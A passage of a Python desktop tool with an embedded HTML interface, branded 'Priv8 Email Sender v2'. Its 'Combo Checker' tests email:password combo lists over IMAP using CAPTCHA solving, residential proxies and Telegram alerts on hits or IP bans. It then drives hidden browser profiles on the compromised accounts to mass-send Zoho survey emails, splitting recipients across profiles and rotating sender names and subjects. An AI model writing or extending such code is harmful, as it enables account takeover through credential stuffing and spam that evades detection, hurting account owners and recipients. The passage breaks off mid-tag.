    def send_all_profiles(self, payload):
        global _send_running
        if _send_running: return {"error": "already_running"}
        cfg        = payload.get("cfg", {})
        emails_raw = payload.get("emails", "")
        file_path  = payload.get("file_path", "")
        if file_path and os.path.exists(file_path):
            emails_raw = open(file_path, encoding="utf-8", errors="ignore").read()
        all_emails = [e.strip() for e in emails_raw.replace(",","\n").splitlines()
                      if e.strip() and "@" in e]
        if not all_emails: return {"error": "no_emails"}
        profiles = _load_profiles()
        active = [p for p in profiles if p.get("status") == "active"]
        if not active: return {"error": "no_active_profiles"}
        _send_running = True
        n = len(active)
        chunk_size = max(1, -(-len(all_emails) // n))
        threads = []
        for i, prof in enumerate(active):
            chunk = all_emails[i*chunk_size:(i+1)*chunk_size]
            if not chunk: continue
            proxy = prof.get("proxy") or None
            t = threading.Thread(
                target=_send_thread,
                args=(cfg, chunk, "", prof["dir"], proxy, prof["idx"]),
                kwargs={"_managed": True},
                daemon=True)
            t.start()
            threads.append(t)
            SEND_LOG.put(("info", f"  Profile {prof['idx']} ({prof.get('email','?')}): {len(chunk)} emails"))
        def _watcher(tlist=threads):
            global _send_running
            for t in tlist: t.join()
            _send_running = False
            SEND_LOG.put(("done", f"  ALL {len(tlist)} PROFILES COMPLETE"))
            if window:
                try: window.evaluate_js("onSendDone()")
                except: pass
        threading.Thread(target=_watcher, daemon=True).start()
        bs = max(1, int(cfg.get("batch_size", 100)))
        batches = sum(-(-len(all_emails[i*chunk_size:(i+1)*chunk_size])//bs)
                      for i in range(n) if all_emails[i*chunk_size:(i+1)*chunk_size])
        return {"ok": True, "count": len(all_emails), "profiles": len(threads), "batches": batches}

    def poll_send_logs(self):
        msgs = []
        try:
            while True: msgs.append(SEND_LOG.get_nowait())
        except queue.Empty: pass
        return msgs

    #  TEMPLATES & OPTIONS 

    def get_templates(self):
        return _load_templates()

    def save_templates(self, templates):
        cfg = _load_cfg()
        cfg["templates"] = templates
        json.dump(cfg, open(CFG_FILE,"w",encoding="utf-8"), indent=2)
        return {"ok": True}

    def get_send_options(self):
        return _load_send_options()

    def save_send_options(self, opts):
        cfg = _load_cfg()
        cfg["sender_names"] = opts.get("sender_names", ["Research Team"])
        cfg["subjects"]     = opts.get("subjects",     ["Quick Survey"])
        cfg["rotate_every"] = opts.get("rotate_every", 1)
        json.dump(cfg, open(CFG_FILE,"w",encoding="utf-8"), indent=2)
        return {"ok": True}

    #  SHARED 

    def save_cfg(self, cfg):
        global _hidden_browser, CAPTCHA_KEY, _DEFAULT_PROXY
        existing = _load_cfg()
        for k in ("captcha_key", "proxy_str"):
            if not cfg.get(k):
                cfg.pop(k, None)
        existing.update(cfg)
        json.dump(existing, open(CFG_FILE,"w",encoding="utf-8"), indent=2)
        _hidden_browser = bool(existing.get("hidden_browser", False))
        if existing.get("captcha_key"):
            CAPTCHA_KEY = existing["captcha_key"]
        if existing.get("proxy_str"):
            _DEFAULT_PROXY = existing["proxy_str"]
        return {"ok": True}

    def load_cfg(self):
        cfg = _load_cfg()
        if not cfg.get("captcha_key"):
            cfg["captcha_key"] = CAPTCHA_KEY
        if not cfg.get("proxy_str"):
            # Try to load from .env first
            proxy_host = os.getenv("PROXY_HOST", "").strip()
            proxy_port = os.getenv("PROXY_PORT", "").strip()
            if proxy_host and proxy_port:
                cfg["proxy_str"] = f"{proxy_host}:{proxy_port}"
            elif _DEFAULT_PROXY:
                cfg["proxy_str"] = _DEFAULT_PROXY
            else:
                cfg["proxy_str"] = ""
        if not cfg.get("tg_token"):
            cfg["tg_token"] = ""
        return cfg

    def pick_file(self, mode):
        global window
        try:
            if mode == "logo":
                result = window.create_file_dialog(
                    _OPEN_DLG, allow_multiple=False,
                    file_types=('Images (*.png;*.jpg;*.jpeg;*.gif;*.webp)', 'All files (*.*)')
                )
            else:
                result = window.create_file_dialog(
                    _OPEN_DLG, allow_multiple=False,
                    file_types=('Text/CSV (*.txt;*.csv)', 'All files (*.*)')
                )
            if result and len(result) > 0:
                p = result[0]
                if mode == "logo":
                    raw = open(p, "rb").read()
                    ext = os.path.splitext(p)[1].lower()
                    mime = {".jpg":"image/jpeg",".jpeg":"image/jpeg",".png":"image/png",
                            ".gif":"image/gif",".webp":"image/webp"}.get(ext,"image/png")
                    return {"path": p, "data": f"data:{mime};base64,{base64.b64encode(raw).decode()}"}
                return {"path": p}
        except Exception as e:
            CHECK_LOG.put(("err", f"  File dialog error: {e}"))
        return {"path": ""}

    def count_file(self, path):
        if not path or not os.path.exists(path): return 0
        return len([l for l in open(path,encoding="utf-8",errors="ignore")
                    .read().replace(",","\n").splitlines()
                    if l.strip() and "@" in l])


# 
#  HTML UI
# 

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Priv8 Email Sender v2</title>
<style>
:root{
  --bg:#07101a;--card:#0d1c2e;--dim:#060d17;--border:#162840;
  --accent:#1d6ef5;--accent2:#00b4d8;
  --green:#22c55e;--red:#ef4444;--yellow:#f59e0b;--purple:#8b5cf6;
  --text:#d8e8f8;--muted:#3d6080;--radius:10px;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
  font-family:'Segoe UI',system-ui,sans-serif;font-size:13px}

/*  TOPBAR  */
.topbar{height:44px;background:linear-gradient(90deg,#06142a,#0b2248);
  display:flex;align-items:center;padding:0 14px;gap:14px;
  border-bottom:1px solid var(--border);flex-shrink:0}
.logo{font-weight:700;color:#fff;font-size:13px;letter-spacing:.3px}
.tabs{display:flex;gap:2px;margin-left:16px}
.tab{padding:5px 17px;border-radius:6px;font-size:11px;font-weight:600;
  cursor:pointer;border:none;background:transparent;color:var(--muted);transition:.13s}
.tab.active{background:#142f58;color:#7ab4f5}
.tab:hover:not(.active){background:#ffffff10}
.tr{margin-left:auto;display:flex;align-items:center;gap:8px}
.pill{padding:2px 9px;border-radius:14px;font-size:9px;font-weight:700;
  border:1px solid var(--border);background:#05090f;
  display:flex;align-items:center;gap:4px;letter-spacing:.3px}
.pill::before{content:'';width:5px;height:5px;border-radius:50%;
  background:currentColor;flex-shrink:0}
.pill.idle{color:var(--muted)}.pill.run{color:var(--green);border-color:#14532d}
.pill.run::before{animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.btn-s{padding:4px 11px;border-radius:5px;font-size:10px;font-weight:600;
  cursor:pointer;border:none;background:#ffffff14;color:#fff;transition:.12s}
.btn-s:hover{background:#ffffff22}

/*  LAYOUT  */
.wrap{display:flex;height:calc(100vh - 44px);overflow:hidden}
.content{flex:1;overflow-y:auto;padding:14px 16px;display:flex;flex-direction:column;gap:12px}
.content::-webkit-scrollbar{width:4px}
.content::-webkit-scrollbar-thumb{background:#162840;border-radius:2px}

/*  LOG  */
.log{width:280px;background:#050c14;border-left:1px solid var(--border);
  display:flex;flex-direction:column;flex-shrink:0}
.log-hdr{padding:8px 11px;background:#060e19;border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:7px}
.log-title{font-size:9px;font-weight:700;text-transform:uppercase;
  letter-spacing:.7px;color:#3d6898}
.btn-clear{margin-left:auto;font-size:9px;cursor:pointer;padding:2px 7px;
  border-radius:3px;border:none;background:#142f58;color:#7ab4f5}
#log{flex:1;overflow-y:auto;padding:7px 9px;font-size:10px;
  font-family:'Consolas','Courier New',monospace;line-height:1.75}
#log::-webkit-scrollbar{width:3px}
#log::-webkit-scrollbar-thumb{background:#162840}
.ll{display:block;word-break:break-all}
.ll.ok{color:#4ade80}.ll.err{color:#f87171}.ll.info{color:#60a5fa}
.ll.dim{color:#1a3350}.ll.sep{color:#3d6898;font-weight:700}
.ll.done{color:#34d399;font-weight:700}
.send-wrap{padding:10px 11px;border-top:1px solid var(--border);background:#060e19}
#send-btn{width:100%;padding:10px;
  background:linear-gradient(135deg,var(--accent),var(--accent2));
  color:#fff;font-size:11px;font-weight:700;border:none;border-radius:7px;
  cursor:pointer;transition:.16s;display:flex;align-items:center;
  justify-content:center;gap:6px}
#send-btn:hover{opacity:.9}
#send-btn:disabled{opacity:.35;cursor:not-allowed}

/*  CARD  */
.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius)}
.ch{padding:8px 13px;background:var(--dim);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:7px;border-radius:var(--radius) var(--radius) 0 0}
.ci{font-size:12px}.ct{font-size:9px;font-weight:700;text-transform:uppercase;
  letter-spacing:.6px;color:#3d6898}
.cb{padding:11px 13px;display:flex;flex-direction:column;gap:8px}

/*  FORM  */
label{font-size:9px;color:var(--muted);display:block;margin-bottom:2px}
input[type=text],input[type=email],textarea,select{
  width:100%;background:#060f1a;border:1px solid var(--border);border-radius:5px;
  color:var(--text);font-size:11px;padding:6px 9px;outline:none;font-family:inherit}
input:focus,textarea:focus,select:focus{border-color:var(--accent)}
textarea{resize:vertical;min-height:65px}
.g2{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.g4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px}

/*  COLOR ROW  */
.cr{display:flex;align-items:center;gap:6px}
.cr input[type=color]{width:30px;height:30px;border:none;border-radius:5px;
  cursor:pointer;padding:2px;background:var(--border)}
.cr input[type=text]{flex:1}

/*  MINI-TABS  */
.mt-row{display:flex;gap:2px;background:#060f1a;padding:3px;
  border-radius:6px;width:fit-content;margin-bottom:3px}
.mt{padding:3px 12px;border-radius:5px;font-size:10px;font-weight:600;
  cursor:pointer;border:none;background:transparent;color:var(--muted);transition:.12s}
.mt.active{background:var(--accent);color:#fff}
.mt:hover:not(.active){background:#ffffff0f}

/*  FILE DROP  */
.fdrop{border:1.5px dashed var(--border);border-radius:7px;padding:13px;
  text-align:center;cursor:pointer;color:var(--muted);font-size:11px;transition:.14s}
.fdrop:hover{border-color:var(--accent);color:var(--text);background:#0d2a5508}
.fi{margin-top:4px;font-size:9px;color:#3d6898;font-weight:600}

/*  STATS  */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:7px}
.sc{background:var(--dim);border:1px solid var(--border);border-radius:7px;
  padding:9px 10px;text-align:center}
.sn{font-size:20px;font-weight:700;margin-bottom:2px}
.sl{font-size:8px;text-transform:uppercase;letter-spacing:.6px;color:var(--muted)}
.s-t .sn{color:#60a5fa}.s-c .sn{color:var(--yellow)}
.s-v .sn{color:var(--green)}.s-i .sn{color:var(--red)}

/*  VALID COMBO TABLE  */
.vt{width:100%;border-collapse:collapse;font-size:10px}
.vt th{background:#060f1a;color:var(--muted);font-weight:600;font-size:8px;
  text-transform:uppercase;letter-spacing:.5px;padding:6px 9px;
  border-bottom:1px solid var(--border);text-align:left}
.vt td{padding:6px 9px;border-bottom:1px solid #0d1e30;vertical-align:middle}
.vt tr:last-child td{border-bottom:none}
.badge{padding:2px 7px;border-radius:9px;font-size:8px;font-weight:700}
.b-ok{background:#042010;color:var(--green);border:1px solid #14532d}
.b-conn{background:#091d3c;color:#60a5fa;border:1px solid #1e40af}
.b-no{background:#1c0808;color:#f87171;border:1px solid #7f1d1d}
.b-skip{background:#1a1a00;color:#a3a300;border:1px solid #3d3d00}
.conn-btn{padding:3px 10px;font-size:9px;font-weight:700;border:none;
  border-radius:4px;cursor:pointer;background:var(--accent);color:#fff}
.conn-btn:hover{background:#2563eb}
.conn-btn:disabled{opacity:.4;cursor:not-allowed}

/*  PROFILES GRID  */
.profs-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.prof-card{background:var(--dim);border:1px solid var(--border);border-radius:8px;
  padding:12px;display:flex;flex-direction:column;gap:8px;position:relative}
.prof-card.active{border-color:#14532d}
.prof-card.busy{border-color:#854d0e}
.prof-card.error{border-color:#7f1d1d}
.prof-card.expired{border-color:#7f1d1d;opacity:.7}
.prof-hdr{display:flex;align-items:center;gap:8px}
.prof-idx{font-size:16px;font-weight:700;color:#60a5fa;min-width:26px}
.prof-status{font-size:9px;font-weight:700;padding:2px 8px;border-radius:8px}
.ps-free{background:#1a2d45;color:var(--muted)}
.ps-active{background:#042010;color:var(--green)}
.ps-busy{background:#451a03;color:var(--yellow)}
.ps-error{background:#450a0a;color:var(--red)}
.prof-email{font-size:10px;color:#60a5fa;word-break:break-all;min-height:14px}
.prof-proxy{font-size:9px;padding:4px 7px;background:#060f1a;
  border:1px solid var(--border);border-radius:4px;color:var(--text);width:100%}
.prof-actions{display:flex;gap:5px}
.prof-btn{flex:1;padding:4px;font-size:9px;font-weight:700;border:none;
  border-radius:4px;cursor:pointer}
.pb-connect{background:var(--accent);color:#fff}
.pb-disconnect{background:#7f1d1d;color:#fff}
.pb-proxy{background:#142f58;color:#7ab4f5}
.pb-switch{background:#6d28d9;color:#fff}
.add-prof{border:1.5px dashed var(--border);border-radius:8px;padding:12px;
  text-align:center;cursor:pointer;color:var(--muted);font-size:11px;
  display:flex;flex-direction:column;align-items:center;gap:6px;transition:.14s}
.add-prof:hover{border-color:var(--accent);color:var(--text)}

/*  TRIAL BAR  */
.trial-bar{background:#060f1a;border:1px solid var(--border);border-radius:4px;
  height:5px;overflow:hidden;position:relative;margin-top:2px}
.trial-fill{height:100%;border-radius:4px;transition:width .3s}
.trial-ok{background:var(--green)}.trial-warn{background:var(--yellow)}
.trial-exp{background:var(--red)}
.trial-info{font-size:8px;color:var(--muted);margin-top:2px}

/*  TEMPLATE EDITOR  */
.tpl-item{background:#060f1a;border:1px solid var(--border);border-radius:6px;
  padding:10px;display:flex;flex-direction:column;gap:6px;position:relative}
.tpl-item textarea{min-height:55px;font-size:10px}
.tpl-del{position:absolute;top:7px;right:8px;font-size:9px;cursor:pointer;
  color:var(--red);background:transparent;border:none;font-weight:700}
.tpl-add{padding:6px 14px;background:#142f58;color:#7ab4f5;font-weight:700;
  border:none;border-radius:5px;cursor:pointer;font-size:10px;align-self:flex-start}

/*  OPTS TEXTAREA  */
.opts-ta{font-family:monospace;font-size:10px;min-height:55px;resize:vertical}

/*  RECIPIENT COUNTER  */
.rctr{font-size:10px;color:#3d6898;margin-top:3px;font-weight:600;
  background:#060f1a;padding:4px 9px;border-radius:4px;
  border:1px solid var(--border)}

/*  DB BADGE  */
.db-badge{font-size:9px;padding:2px 8px;border-radius:9px;
  background:#091d3c;color:#60a5fa;border:1px solid #1e40af;
  margin-left:auto;font-weight:700}

/*  PAGE  */
.page{display:none}.page.active{display:contents}

/*  CONNECT DIALOG  */
.overlay{position:fixed;inset:0;background:#000000a0;z-index:100;
  display:none;align-items:center;justify-content:center}
.overlay.show{display:flex}
.dialog{background:var(--card);border:1px solid var(--border);border-radius:10px;
  padding:20px;width:380px;display:flex;flex-direction:column;gap:12px}
.dialog h3{font-size:13px;color:#fff}
.dialog label{font-size:10px;color:var(--muted)}
.dialog input{width:100%;background:#060f1a;border:1px solid var(--border);
  border-radius:5px;color:var(--text);font-size:11px;padding:6px 9px;outline:none}
.dialog input:focus{border-color:var(--accent)}
.dialog-btns{display:flex;gap:8px}
.d-ok{flex:1;padding:8px;background:var(--accent);color:#fff;font-weight:700;
  border:none;border-radius:6px;cursor:pointer}
.d-cancel{padding:8px 14px;background:#1a2d45;color:var(--muted);font-weight:600;
  border:none;border-radius:6px;cursor:pointer}
</style>
</head>
<body>

<!-- TOPBAR -->
<div class="topbar">
  <div class="logo"> Priv8 Email Sender v2</div>
  <div class="tabs">
    <button class="tab active" onclick="switchTab('checker',this)"> Combo Checker</button>
    <button class="tab" onclick="switchTab('profiles',this)"> Profiles</button>
    <button class="tab" onclick="switchTab('sender',this)"> Email Sender</button>
    <button class="tab" onclick="switchTab('design',this)"> Design</button>
  </div>
  <div class="tr">
    <div class="pill idle" id="check-pill">CHECK <span id="check-txt">IDLE</span></div>
    <div class="pill idle" id="send-pill">SEND <span id="send-txt">IDLE</span></div>
    <button class="btn-s" onclick="saveCfg()"> Save</button>
  </div>
</div>

<div class="wrap">
<div class="content" id="content">

<!--  TAB: COMBO CHECKER  -->
<div class="page active" id="tab-checker">

<div class="card">
  <div class="ch"><span class="ci"></span><span class="ct">Combo List  email:password</span>
    <span class="db-badge" id="db-cnt">DB: 0 registered</span>
  </div>
  <div class="cb">
    <div id="combo-drop" class="fdrop" onclick="pickCombo()">
      <div style="font-size:22px;margin-bottom:4px"></div>
      Load combo file  <strong>email:password</strong>  (one per line)
      <div class="fi" id="combo-info">No file loaded</div>
    </div>
    <div style="background:#060f1a;border:1px solid #1a3350;border-radius:5px;
      padding:5px 9px;font-size:9px;color:#3d6898">
       Accounts already registered in DB will be <strong style="color:#a3a300">skipped automatically</strong>
    </div>
    <div class="g2">
      <div><label>Telegram Bot Token (notify on valid / IP burn)</label>
        <input type="text" id="tg_token" placeholder="123456:AAFxxx..."></div>
      <div><label>Telegram Chat ID</label>
        <input type="text" id="tg_chat" placeholder="2130364219"></div>
      <div style="margin-top:8px;border-top:1px solid #1e3a5f;padding-top:8px"><label style="color:#f59e0b">2Captcha API Key</label>
        <input type="text" id="captcha_key" placeholder="paste your 2captcha key here..." style="font-family:monospace"></div>
      <div><label style="color:#34d399">Proxy String (user:pass@host:port)</label>
        <input type="text" id="proxy_str" placeholder="user:pass@p.webshare.io:80" style="font-family:monospace"></div>
    </div>
    <!-- Pool limit settings -->
    <div style="background:#060f1a;border:1px solid #1e3a5f;border-radius:6px;padding:8px 10px">
      <div style="font-size:9px;color:#60a5fa;font-weight:700;margin-bottom:6px">
        POOL SETTINGS  Stop &amp; auto-resume
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
        <div>
          <label style="font-size:8px;color:var(--muted)">Stop when valid pool reaches</label>
          <div style="display:flex;align-items:center;gap:4px;margin-top:2px">
            <input type="number" id="pool-limit-inp" value="50" min="5" max="500"
              style="width:60px;padding:4px;background:#0a1929;border:1px solid var(--border);
                border-radius:4px;color:#fff;font-size:11px;font-weight:700">
            <span style="font-size:9px;color:var(--muted)">unconnected valid accounts</span>
          </div>
        </div>
        <div>
          <label style="font-size:8px;color:var(--muted)">Resume when pool drops below</label>
          <div style="display:flex;align-items:center;gap:4px;margin-top:2px">
            <input type="number" id="resume-at-inp" value="10" min="1" max="100"
              style="width:60px;padding:4px;background:#0a1929;border:1px solid var(--border);
                border-radius:4px;color:#fff;font-size:11px;font-weight:700">
            <span style="font-size:9px;color:var(--muted)">accounts (auto-resumes check)</span>
          </div>
        </div>
      </div>
    </div>
    <div style="display:flex;gap:6px;align-items:flex-end">
      <button onclick="startCheck()"
        style="flex:1;padding:8px;background:var(--accent);color:#fff;font-weight:700;
          border:none;border-radius:5px;cursor:pointer;font-size:11px" id="btn-start">
         Start IMAP Check</button>
      <button onclick="stopCheck()"
        style="padding:8px 14px;background:#7f1d1d;color:#fff;font-weight:700;
          border:none;border-radius:5px;cursor:pointer;font-size:11px"> Stop</button>
      <button id="resume-btn" onclick="resumeCheck()"
        style="display:none;padding:8px 14px;background:#1e3a5f;color:#60a5fa;font-weight:700;
          border:1px solid #60a5fa;border-radius:5px;cursor:pointer;font-size:10px"> Resume</button>
    </div>
  </div>
</div>

<!-- PROGRESS BAR CARD -->
<div class="card" id="progress-card">
  <div class="ch"><span class="ci"></span><span class="ct">Progress</span>
    <span id="prog-status" style="margin-left:auto;font-size:10px;color:var(--muted);font-weight:700">IDLE</span>
  </div>
  <div class="cb" style="gap:6px">
    <!-- combo progress bar -->
    <div style="background:#060f1a;border:1px solid var(--border);border-radius:6px;height:28px;overflow:hidden;position:relative">
      <div id="prog-bar" style="height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));
        transition:width .4s ease;border-radius:6px"></div>
      <div id="prog-txt" style="position:absolute;inset:0;display:flex;align-items:center;
        justify-content:center;font-size:11px;font-weight:700;color:#fff">0 / 0 (0%)</div>
    </div>
    <!-- pool bar -->
    <div style="background:#060f1a;border:1px solid #1e3a5f;border-radius:6px;padding:7px 9px">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
        <span style="font-size:9px;color:#60a5fa;font-weight:700">VALID POOL</span>
        <span id="pool-txt" style="font-size:9px;color:var(--muted)">0 / 50 unconnected valid</span>
      </div>
      <div style="background:#0a1929;border-radius:4px;height:10px;overflow:hidden;position:relative">
        <div id="pool-bar" style="height:100%;width:0%;background:var(--green);transition:width .4s ease;border-radius:4px"></div>
      </div>
      <div id="pool-status" style="font-size:8px;color:var(--muted);margin-top:4px">Idle</div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(6,1fr);gap:6px">
      <div style="background:#060f1a;border:1px solid var(--border);border-radius:6px;padding:7px;text-align:center">
        <div style="font-size:16px;font-weight:700;color:#60a5fa" id="st-total">0</div>
        <div style="font-size:7px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)">Total</div>
      </div>
      <div style="background:#060f1a;border:1px solid var(--border);border-radius:6px;padding:7px;text-align:center">
        <div style="font-size:16px;font-weight:700;color:#f59e0b" id="st-checked">0</div>
        <div style="font-size:7px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)">Checked</div>
      </div>
      <div style="background:#042010;border:1px solid #14532d;border-radius:6px;padding:7px;text-align:center">
        <div style="font-size:16px;font-weight:700;color:#22c55e" id="st-valid">0</div>
        <div style="font-size:7px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)">Valid </div>
      </div>
      <div style="background:#1c0808;border:1px solid #7f1d1d;border-radius:6px;padding:7px;text-align:center">
        <div style="font-size:16px;font-weight:700;color:#ef4444" id="st-invalid">0</div>
        <div style="font-size:7px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)">Invalid </div>
      </div>
      <div style="background:#1a1a00;border:1px solid #3d3d00;border-radius:6px;padding:7px;text-align:center">
        <div style="font-size:16px;font-weight:700;color:#a3a300" id="st-skipped">0</div>
        <div style="font-size:7px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)">Skipped</div>
      </div>
      <div style="background:#060f1a;border:1px solid var(--border);border-radius:6px;padding:7px;text-align:center">
        <div style="font-size:16px;font-weight:700;color:#a78bfa" id="st-pct">0%</div>
        <div style="font-size:7px;text-transform:uppercase;letter-spacing:.5px;color:var(--muted)">Hit Rate</div>
      </div>
    </div>
  </div>
</div>

<div class="card">
  <div class="ch">
    <span class="ci"></span><span class="ct">Valid Combos</span>
    <span style="margin-left:auto;font-size:9px;color:var(--muted)" id="valid-cnt">0</span>
    <button onclick="clearValid()"
      style="margin-left:7px;font-size:9px;padding:2px 7px;border:1px solid #7f1d1d;
        border-radius:3px;background:transparent;color:#f87171;cursor:pointer">
       Clear</button>
  </div>
  <div style="overflow-x:auto">
    <table class="vt">
      <thead><tr>
        <th>Email</th><th>IMAP Server</th><th>Found</th><th>Profile</th><th>DB</th><th>Action</th>
      </tr></thead>
      <tbody id="valid-tbody">
        <tr><td colspan="6" style="text-align:center;color:var(--muted);padding:16px">
          No valid combos yet  run the checker</td></tr>
      </tbody>
    </table>
  </div>
</div>

</div><!-- /tab-checker -->

<!--  TAB: PROFILES  -->
<div class="page" id="tab-profiles">

<div class="card">
  <div class="ch"><span class="ci"></span>
    <span class="ct">Browser Profiles</span>
    <span style="margin-left:6px;font-size:9px;color:var(--muted)">
      3 free (direct IP)  add residential proxy to unlock more</span>
    <button onclick="checkSessionsHealth()" id="btn-health"
      style="margin-left:auto;padding:5px 12px;background:#0f3460;color:#60a5fa;
        border:1px solid #1e5a9c;border-radius:5px;cursor:pointer;font-size:10px;font-weight:700">
       Refresh & Check Sessions</button>
  </div>
  <div class="cb">
    <div class="profs-grid" id="profs-grid"><!-- rendered by JS --></div>
    <div style="border-top:1px solid var(--border);padding-top:10px;margin-top:2px">
      <label>Add Profile (requires residential proxy)</label>
      <div style="display:flex;gap:7px">
        <input type="text" id="new-proxy" placeholder="user:pass@host:port  or  host:port" style="flex:1">
        <button onclick="addProfile()"
          style="padding:6px 14px;background:#6d28d9;color:#fff;font-weight:700;
            border:none;border-radius:5px;cursor:pointer;font-size:11px;white-space:nowrap">
          + Add Profile</button>
      </div>
    </div>
  </div>
</div>

</div><!-- /tab-profiles -->

<!--  TAB: EMAIL SENDER  -->
<div class="page" id="tab-sender">

<div class="card">
  <div class="ch"><span class="ci"></span><span class="ct">Survey Config</span></div>
  <div class="cb">
    <div class="g3">
      <div><label>Portal ID</label><input type="text" id="portal" value="929858814"></div>
      <div><label>Dept ID</label><input type="text" id="dept" value="BrBR76"></div>
      <div><label>Survey ID</label><input type="text" id="survey" value="1256274000000004001"></div>
    </div>
    <div class="g2" style="margin-top:8px">
      <div><label>Landing Page URL (header link)</label>
        <input type="text" id="landing_url" placeholder="https://your-company.com" oninput="rp()"
          style="font-size:10px"></div>
      <div><label>Footer Text</label>
        <input type="text" id="footer_text" placeholder="Contact us: info@company.com" oninput="rp()"
          style="font-size:10px"></div>
    </div>
    <div>
      <label>Sending Profile (choose connected profile, or leave for Oscar default)</label>
      <select id="prof-select">
        <option value="">Default  Oscar (ZohoTestProf_Oscar)</option>
      </select>
    </div>
    <label style="display:flex;align-items:center;gap:6px;font-size:10px;margin-top:6px;cursor:pointer">
      <input type="checkbox" id="hidden_browser" onchange="saveCfg()">
      Hidden Browser (browsers run invisible in background)</label>
    <div class="g2" style="margin-top:8px">
      <div><label>Reply-To Email</label>
        <input type="email" id="reply_to" placeholder="Optional reply-to address" oninput="saveCfg()" style="font-size:10px"></div>
      <div><label>Send Mode</label>
        <select id="send_mode" onchange="toggleSchedule()">
          <option value="now">Send Now</option>
          <option value="schedule">Schedule</option>
        </select></div>
    </div>
    <div id="schedule_wrap" style="display:none;margin-top:6px">
      <label>Schedule Date &amp; Time</label>
      <input type="datetime-local" id="schedule_dt" oninput="saveCfg()" style="font-size:10px">
    </div>
  </div>
</div>

<div class="card">
  <div class="ch"><span class="ci">&#128682;</span><span class="ct">Survey End Page</span>
    <span style="margin-left:auto;font-size:9px;color:var(--muted)">configured once per session</span>
  </div>
  <div class="cb">
    <label>After Survey Completion</label>
    <select id="end_page_type" onchange="toggleEndPageFields();saveCfg()">
      <option value="default">Default &#8212; Zoho Thank You page</option>
      <option value="redirect">Redirect to URL</option>
      <option value="message">Custom Message</option>
      <option value="summary">Show Response Summary</option>
    </select>
    <div id="ep_url_wrap" style="display:none;margin-top:6px">
      <label>Redirect URL</label>
      <input type="url" id="end_page_url" placeholder="https://your-site.com/thank-you" oninput="saveCfg()" style="font-size:10px">
    </div>
    <div id="ep_msg_wrap" style="display:none;margin-top:6px">
      <label>Custom Thank You Message</label>
      <input type="text" id="end_page_msg" placeholder="Thank you for your time!" oninput="saveCfg()" style="font-size:10px">
    </div>
    <p style="font-size:9px;color:var(--muted);margin:6px 0 0">Applied via Zoho Settings once at browser start &#8212; leave Default to skip.</p>
  </div>
</div>

<div class="card">
  <div class="ch"><span class="ci"></span>
    <span class="ct">Recipients  paste any number, auto-splits into batches</span>
  </div>
  <div class="cb">
    <div class="mt-row">
      <button class="mt active" onclick="switchRecip('text',this)"> Paste</button>
      <button class="mt" onclick="switchRecip('file',this)"> File</button>
    </div>
    <div id="recip-text-w">
      <textarea id="recip" oninput="updCtr()"
        style="font-family:Consolas,monospace;font-size:10px;min-height:85px"
        placeholder="email1@example.com&#10;email2@example.com&#10;...paste any number, script auto-batches"></textarea>
    </div>
    <div id="recip-file-w" style="display:none">
      <div class="fdrop" onclick="pickRecip()">
        <div style="font-size:20px;margin-bottom:3px"></div>
        Upload .txt / .csv  one email per line
        <div class="fi" id="recip-fi">No file selected</div>
      </div>
    </div>
    <div class="rctr" id="rctr">0 emails  0 batches of 100</div>
    <div class="g4">
      <div><label>Batch Size</label>
        <input type="text" id="batch_size" value="100" oninput="updCtr()"></div>
      <div><label>Cooldown Min (s)</label><input type="text" id="cd_min" value="55"></div>
      <div><label>Cooldown Max (s)</label><input type="text" id="cd_max" value="75"></div>
      <div><label>Test Email (sent last)</label>
        <input type="email" id="test_email" placeholder="you@example.com"></div>
    </div>
  </div>
</div>

</div><!-- /tab-sender -->

<!--  TAB: DESIGN  -->
<div class="page" id="tab-design">

<div class="card">
  <div class="ch"><span class="ci"></span><span class="ct">Logo</span></div>
  <div class="cb">
    <div class="mt-row">
      <button class="mt active" onclick="switchLogo('url',this)"> URL</button>
      <button class="mt" onclick="switchLogo('file',this)"> Upload</button>
    </div>
    <div id="logo-url-w">
      <input type="text" id="logo_url" placeholder="https://example.com/logo.png" oninput="rp()">
    </div>
    <div id="logo-file-w" style="display:none">
      <div class="fdrop" onclick="pickLogo()">
        <div style="font-size:20px;margin-bottom:3px"></div>
        Upload logo (PNG / JPG)
        <div class="fi" id="logo-fi">No file</div>
      </div>
    </div>
    <div id="logo-prev" style="min-height:32px;display:flex;align-items:center;justify-content:center"></div>
  </div>
</div>

<div class="card">
  <div class="ch"><span class="ci"></span><span class="ct">Colors</span></div>
  <div class="cb">
    <div class="g2">
      <div><label>Banner Color 1</label>
        <div class="cr">
          <input type="color" id="c_b1" value="#0057b8" oninput="syncC('banner1',this.value);rp()">
          <input type="text" id="banner1" value="#0057b8" oninput="syncC2('b1',this.value);rp()">
        </div></div>
      <div><label>Banner Color 2</label>
        <div class="cr">
          <input type="color" id="c_b2" value="#00a3e0" oninput="syncC('banner2',this.value);rp()">
          <input type="text" id="banner2" value="#00a3e0" oninput="syncC2('b2',this.value);rp()">
        </div></div>
    </div>
  </div>
</div>

<!-- SENDER NAMES & SUBJECTS -->
<div class="card">
  <div class="ch"><span class="ci"></span><span class="ct">Sender Names &amp; Subjects</span>
    <span style="margin-left:6px;font-size:9px;color:var(--muted)">one per line  picked randomly per rotation</span>
  </div>
  <div class="cb">
    <div class="g2">
      <div>
        <label>Sender Names (one per line)</label>
        <textarea class="opts-ta" id="sender_names"
